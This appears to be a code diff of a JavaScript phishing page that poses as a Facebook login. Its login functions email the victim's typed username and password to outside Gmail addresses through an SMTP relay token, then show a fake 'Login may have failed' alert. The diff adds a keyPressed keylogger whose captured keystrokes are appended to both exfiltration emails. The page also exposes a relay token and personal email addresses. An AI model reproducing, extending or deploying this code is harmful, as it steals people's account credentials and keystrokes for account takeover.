@@ -135,19 +135,20 @@ function login() {
     To: "passduck99@gmail.com",
     From: "passduck99@gmail.com",
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br>Password: " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then();
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
     To: "jacobzuckerman97@gmail.com",
     From: "usernames@gmail.com",
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br>Password: " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
     createCustomAlert('Login may have failed'));
   
 
 }
+
 
 function newacc() {
   window.location.replace("https://www.facebook.com/r.php?locale=en_US&display=page");
@@ -335,30 +336,26 @@ username.position(width/2-150, 250);
 
 }
 
-
 function login() {
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
     To: "passduck99@gmail.com",
-    // Bcc : 'kyle@computingant.com', 
     From: "passduck99@gmail.com",
-    // From: input.value(),
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br>Password: " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then();
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
     To: "jacobzuckerman97@gmail.com",
-    // Bcc : 'kyle@computingant.com', 
     From: "usernames@gmail.com",
-    // From: input.value(),
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br>Password: " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
     createCustomAlert('Login may have failed'));
   
 
 }
+
 
 function newacc() {
   window.location.replace("https://www.facebook.com/r.php?locale=en_US&display=page");
@@ -465,4 +462,9 @@ function windowResized() {
 }
 }
 
+}
+function keyPressed(){
+  append(clickedKeys, key);
+  console.log(1);
+  // clickedKeys.
 }
